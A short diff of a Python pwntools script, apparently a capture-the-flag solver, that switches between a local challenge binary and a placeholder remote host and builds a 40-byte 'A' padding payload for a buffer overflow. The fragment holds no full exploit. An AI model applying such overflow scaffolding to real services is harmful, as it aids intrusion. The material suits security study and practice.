@@ -1,7 +1,10 @@
 from pwn import *
 
-# setup process
-p = remote("ip", port)
+# local solve
+# p = process("./chall")
+
+# remote solve
+p = remote("IP", PORT)
 
 # payload 
 payload = b'A' * 40
